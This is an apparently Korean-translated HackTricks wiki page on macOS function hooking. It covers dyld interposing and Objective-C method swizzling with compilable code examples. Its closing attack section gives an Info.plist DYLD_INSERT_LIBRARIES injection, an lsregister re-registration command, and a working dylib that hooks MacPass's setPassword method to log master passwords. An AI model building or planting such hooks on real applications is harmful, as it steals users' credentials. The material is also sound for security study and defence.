# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

**`__interpose`** 섹션(또는 **`S_INTERPOSING`** 플래그가 있는 섹션)을 포함하는 **dylib**를 생성하여 **원본** 및 **대체** 함수에 대한 **함수 포인터**의 튜플을 포함합니다.

그런 다음 **`DYLD_INSERT_LIBRARIES`**로 dylib를 **주입**합니다(인터포징은 메인 앱이 로드되기 전에 발생해야 합니다). 명백히 [**`DYLD_INSERT_LIBRARIES`** 사용에 적용되는 **제한**이 여기에도 적용됩니다](../macos-proces-abuse/macos-library-injection/#check-restrictions).&#x20;

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
## 메서드 스위즐링

ObjectiveC에서 메서드는 다음과 같이 호출됩니다: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

필요한 것은 **객체**, **메서드** 및 **매개변수**입니다. 메서드가 호출될 때 **msg가 전송**되며, 함수 **`objc_msgSend`**를 사용합니다: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

객체는 **`someObject`**, 메서드는 **`@selector(method1p1:p2:)`**이며, 인수는 **value1**, **value2**입니다.

객체 구조를 따라가면 **메서드 배열**에 접근할 수 있으며, 여기에는 **이름**과 **메서드 코드에 대한 포인터**가 **위치**해 있습니다.

> [!CAUTION]
> 메서드와 클래스가 이름을 기반으로 접근되기 때문에 이 정보는 바이너리에 저장됩니다. 따라서 `otool -ov </path/bin>` 또는 [`class-dump </path/bin>`](https://github.com/nygard/class-dump)로 이를 검색할 수 있습니다.

### 원시 메서드 접근

다음 예와 같이 메서드의 이름, 매개변수 수 또는 주소와 같은 정보를 접근할 수 있습니다:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

함수 **`method_exchangeImplementations`**는 **하나의 함수의 구현 주소를 다른 함수로 변경**할 수 있게 해줍니다.

> [!CAUTION]
> 따라서 함수가 호출될 때 **실행되는 것은 다른 함수**입니다.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> 이 경우 **정상** 메서드의 **구현 코드**가 **메서드** **이름**을 **검증**하면 이 스위즐링을 **감지**하고 실행을 방지할 수 있습니다.
>
> 다음 기술은 이러한 제한이 없습니다.

### method_setImplementation을 사용한 메서드 스위즐링

이전 형식은 서로 다른 두 메서드의 구현을 변경하기 때문에 이상합니다. **`method_setImplementation`** 함수를 사용하면 **하나의 메서드의 구현을 다른 메서드로 변경**할 수 있습니다.

새로운 구현에서 호출하기 위해 원래 구현의 주소를 **저장하는 것을 잊지 마세요**. 나중에 그 주소를 찾는 것이 훨씬 복잡해질 것입니다.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## 후킹 공격 방법론

이 페이지에서는 함수를 후킹하는 다양한 방법에 대해 논의했습니다. 그러나 이들은 **공격을 위해 프로세스 내에서 코드를 실행하는 것**을 포함했습니다.

이를 위해 가장 쉬운 기술은 [환경 변수를 통한 Dyld 주입 또는 하이재킹](../macos-dyld-hijacking-and-dyld_insert_libraries.md)을 사용하는 것입니다. 그러나 이것은 [Dylib 프로세스 주입](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port)을 통해서도 수행될 수 있다고 생각합니다.

그러나 두 옵션 모두 **보호되지 않은** 바이너리/프로세스에 **제한적**입니다. 각 기술을 확인하여 제한 사항에 대해 더 알아보세요.

그러나 함수 후킹 공격은 매우 구체적이며, 공격자는 **프로세스 내부에서 민감한 정보를 훔치기 위해** 이를 수행합니다(그렇지 않으면 프로세스 주입 공격을 수행할 것입니다). 이 민감한 정보는 MacPass와 같은 사용자 다운로드 앱에 위치할 수 있습니다.

따라서 공격자의 벡터는 취약점을 찾거나 애플리케이션의 서명을 제거하고, 애플리케이션의 Info.plist를 통해 **`DYLD_INSERT_LIBRARIES`** 환경 변수를 주입하여 다음과 같은 것을 추가하는 것입니다:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
그리고 나서 **재등록** 애플리케이션:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
해당 라이브러리에 정보를 유출하는 후킹 코드를 추가하세요: 비밀번호, 메시지...

> [!CAUTION]
> 최신 버전의 macOS에서는 애플리케이션 바이너리의 **서명을 제거**하고 이전에 실행된 경우, macOS는 **더 이상 애플리케이션을 실행하지 않습니다**.

#### 라이브러리 예제
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## References

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{{#include ../../../banners/hacktricks-training.md}}
